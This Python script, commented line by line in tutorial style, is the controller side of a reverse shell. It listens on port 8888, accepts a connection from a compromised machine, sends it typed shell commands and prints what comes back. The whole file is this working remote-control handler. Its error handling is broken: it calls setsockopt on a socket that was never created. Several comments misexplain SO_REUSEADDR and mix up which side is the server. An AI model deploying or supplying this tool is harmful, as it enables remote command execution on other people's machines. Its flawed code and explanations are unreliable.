# Import the necessary libraries

# Import the necessary functions from the socket library
from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, error, socket
from sys import exit
from time import sleep


# Recursive function to try to bind to the socket
def bind_socket():

    # Try to complete the binding of the socket
    try:

        # Appropriate message is displayed
        print("Binding the Port:", port)

        # Bind to the specified host and port
        s.bind((host, port))

        # Since it is the server socket, it will listen
        s.listen(5)

    # Socket is unable to bind to the specific socket address
    except error as msg:

        # We seek to try binding again
        # Appropriate message is displayed
        print("Socket Binding error", msg)

        # Seek to retry
        # Appropriate message is displayed
        print("Retrying...")

        # Wait for an interval of 5 seconds for the function to end
        sleep(5)

        # Retry binding by calling the same function recursively
        bind_socket()


# Host is initialised
host = ""

# Standard port is initialised
port = 8888

# Uninitialised socket at server
s = None

# Create the server socket
try:

    # Try to create the server socket with any IP address and TCP Stream
    s = socket(AF_INET, SOCK_STREAM)

# Unable to create server socket
except error as msg:

    # Appropriate message is displayed
    print("Socket creation error:", msg)

    # Since we are not able to normally bind to the socket
    # We will forcibly bind to the socket

    # SOL_SOCKET manipulates the current socket in use
    # SO_REUSEADDR forcefully attaches to the address of the same socket
    # 1 is a BOOL value for True which sets the forceful attachment to True
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# Bind the socket to the specified host and port using the above user-defined function
bind_socket()

# Binding is complete which indicates the server is listening
# Appropriate message is displayed
print("Server Listening...")

# Accept the socket connection from the client connection
conn, address = s.accept()

# Appropriate message is displayed
print("Connection has been established! |", "IP", address[0], "| Port",
      address[1])

# The client sends the working directory to print before entering the command
# It needs to be displayed to the user for him to learn the current working directory

# The received bytes have to be decoded to string
print(conn.recv(2048).decode("utf-8"), end="")

# We will continue to take shell commands till we don't exit
while True:

    # Take the shell command from the user as a string
    cmd = str(input())

    # If the command to exit the shell is entered, exit the shell
    if cmd == "exit":

        # Tell the client to close the connection
        # Send closing message to the client
        # We encode to send the string as bytes across the connection
        conn.send(cmd.encode())

        # Close the connection
        conn.close()

        # Close the socket
        s.close()

        # Exit the program
        exit()

    # If a valid command is entered in the shell other than exit
    # We need to parse it and send it to the server to execute on the reverse shell

    if len(cmd.encode()):

        # We encode to send the commanded string as bytes across the connection
        conn.send(cmd.encode())

        # Display the contents of the output of the executed shell command on the screen
        # As the reverse shell runs on the client it is sent to the server which displays it

        # Decode the reveived bytes to a string to display string output
        print(conn.recv(2048).decode("utf-8"), end="")
